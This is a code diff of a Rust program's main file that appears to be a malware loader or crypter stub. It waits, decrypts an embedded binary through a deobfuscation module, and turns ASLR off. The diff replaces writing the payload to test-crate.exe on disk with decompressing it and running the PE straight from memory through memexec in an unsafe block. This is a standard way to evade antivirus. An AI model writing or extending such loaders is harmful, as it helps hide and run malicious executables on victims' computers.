@@ -1,16 +1,12 @@
-use brotli::DecompressorWriter;
-
 use constants::*;
 use rand::{thread_rng, Rng};
-use std::{fs::File, io::Write, thread::sleep, time::Duration};
-
-// use crate::loader::allocate_data;
+use std::{thread::sleep, time::Duration, io};
 
 mod constants;
 mod deobfuscation;
 mod loader;
 
-fn main() {
+fn main() -> io::Result<()> {
     wait();
 
     let decrypted_binary = deobfuscation::decrypt_data(
@@ -21,12 +17,15 @@ fn main() {
 
     const ASLR: bool = false;
 
-    // allocate_data(ASLR);
+    let mut decompress_binary = vec![];
 
-    let file = File::create("./test-crate.exe").unwrap();
-    let mut writer = DecompressorWriter::new(file, 0);
+    deobfuscation::decompress_data(decrypted_binary, &mut decompress_binary)?;
 
-    writer.write_all(decrypted_binary).unwrap();
+    unsafe {
+        memexec::memexec_exe(&decompress_binary).expect("the PE file should load fine");
+    }
+
+    Ok(())
 }
 
 fn wait() {
